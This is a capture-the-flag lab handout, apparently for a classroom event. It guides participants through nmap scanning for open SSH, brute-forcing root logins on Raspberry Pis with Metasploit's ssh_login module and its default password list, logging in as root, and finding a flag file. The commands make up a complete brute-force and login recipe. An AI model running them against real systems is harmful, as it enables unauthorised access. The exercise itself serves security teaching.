# Capture The Flag With Metasploit

## The Targets

Find raspberry pi's running on the network with port 22 (SSH) open:

```bash
nmap -p 22 --open 192.168.1.0/24
```

## The Brute Force Password Attack

We will use a brute force password attack against the targets we found in the previous step.

### Password List

Viewing our list of passwords that comes with metasploit:

```bash
cat /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
```

### Starting Metasploit

Let's launch the metasploit command shell:

```bash
msfconsole
```

### Loading The SSH Login Attack

msf > `use auxiliary/scanner/ssh/ssh_login`

### Configuring The Attack
We'll load the file that we created in the previous step with our targets as our "RHOSTS" (Remote Hosts):

msf auxiliary(ssh_login) > `set RHOSTS 192.168.1.1-10`

msf auxiliary(ssh_login) > `set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt`

msf5 auxiliary(scanner/ssh/ssh_login) > `set THREADS 10`

### Running The Attack

msf auxiliary(ssh_login) > `run`

Now exit the metasploit shell:
`exit -y`

If you're successful you will see the output above. Now grab this ip address and login with it via ssh using the password matched:

`ssh root@<the ip address here>`

## Find The Flag

There is a file named "cyber2019flag.txt" somewhere on the file system. Use the find command to locate this file on the file system and then grap the secret code inside and be the first to write it on the dry erase board up front!

Hint:

```bash
find / -name <some filename here>
```
